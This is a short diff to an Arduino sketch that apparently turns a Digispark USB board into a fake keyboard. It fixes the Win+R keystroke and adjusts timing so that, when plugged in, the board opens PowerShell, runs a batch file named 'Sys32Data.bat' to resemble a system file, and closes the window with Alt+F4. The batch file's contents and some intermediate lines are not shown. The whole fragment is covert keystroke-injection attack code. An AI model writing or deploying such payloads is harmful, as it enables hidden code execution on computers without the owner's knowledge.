@@ -9,7 +9,8 @@ void loop()
  int d=1000;
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(d);
- DigiKeyboard.sendKeyStroke(0,MOD_GUI_LEFT);
+ DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+ DigiKeyboard.delay(600);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(50);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
@@ -21,7 +22,7 @@ void loop()
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("start Sys32Data.bat");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
- DigiKeyboard.delay(1000);
+ DigiKeyboard.delay(d);
  DigiKeyboard.sendKeyStroke(KEY_F4|MOD_ALT_LEFT);
  DigiKeyboard.delay(50000);
  for(;;){}
